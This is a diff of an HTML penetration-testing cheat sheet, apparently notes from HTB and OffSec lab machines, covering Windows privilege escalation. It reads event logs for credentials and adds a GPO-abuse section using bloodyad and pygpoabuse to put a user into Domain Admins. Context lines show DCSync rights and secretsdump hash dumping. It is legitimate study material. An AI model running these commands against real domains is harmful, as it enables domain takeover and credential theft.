@@ -414,7 +414,7 @@ PS C:\Windows\system32> Start-ScheduledTask -TaskName "GrantAllPerms"
                             <p>Sometimes we can find valuable information in logs, we can read them by using <b>wevtutil or Get-WinEvent in powershell</b></p>
                             <p>Have in mind that we only be able to read logs if we are in the group "Event Log Readers" or if we are an Administrator</p>
                             <p>All logs can be found in <b>C:\Windows\System32\winevt\Logs\</b></p>
-                            <h3>wevtutil</h3>
+                            <h4>wevtutil</h4>
                             <ul>
                                 <p><b>qe</b> for specifying the log file, <b>rd</b> indicates reverse true which orders events from new to old, <b>/f</b> defines the output as text</p>
                                 <pre><code class="language-powershell">wevtutil qe Security /rd:true /f:text | Select-String "/user"</code></pre>
@@ -423,14 +423,15 @@ PS C:\Windows\system32> Start-ScheduledTask -TaskName "GrantAllPerms"
 
                                 <p>We can also specify logs from a remote computer. In this case we need to specify a username and password</p>
                                 <pre><code class="language-powershell">wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"</code></pre>
-                            </ul> 
-                            </ul>   
-
-                            <h3>Get-WinEvent</h3>
+                            </ul>
+                            <h4>Get-WinEvent</h4>
                             <ul>
                                 <p>Searching for events that contain "/user" parameter</p>
                                 <pre><code class="language-powershell">Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}</code></pre>
-                            </ul> 
+                            </ul>  
+                            </ul>   
+
+                            
                        <h3>DnsAdmins</h3>
                        <ul>
                         <p>Members of the DnsAdmins group have access to DNS information on the network. Since windows DNS service supports custom plugins and call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones this service is vulnerable to privilege escalation or information leakage</p>
@@ -820,6 +821,18 @@ $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\dam
                             <pre><code class="language-bash"> python dacledit.py -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' 'htb.local'/'svc-alfresco':'s3rvice'</code></pre>
                             <p>An then remotely performed a dump of all the hashes from the domain</p>
                             <pre><code class="language-bash">impacket-secretsdump -outputfile result.txt  -just-dc htb.local/svc-alfresco@10.129.95.210</code></pre>
+                        </ul>
+
+                        <h3>WriteDacl over Default Domain Policy</h3>
+                        <ul>
+                            <p>Set youself as the owner of the GPO</p>
+                            <pre><code class="language-bash">bloodyad --dc-ip "192.168.226.172" -d "vault.offsec" -u "anirudh" -p 'SecureHM' set owner 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'anirudh'</code></pre>
+                            <p>Now apply generic all permissions to the GPO</p>
+                            <pre><code class="language-bash">bloodyad --dc-ip "192.168.226.172" -d "vault.offsec" -u "anirudh" -p 'SecureHM' add genericAll 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'anirudh'</code></pre>
+                            <p>Create the scheduled task</p>
+                            <pre><code class="language-bash">python3 pygpoabuse.py vault.offsec/'anirudh':'SecureHM' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -taskname SecurityUpdate -dc-ip 192.168.226.172 -command 'net group "Domain Admins" anirudh /add /domain' -filter-enabled -target-dns-name dc.vault.offsec -f</code></pre>
+                            <p>Then login with the compromised account and perform a</p>
+                            <pre><code class="language-bash">gpupdate /force</code></pre>
                         </ul>
 
                         <h3>Enable account</h3>
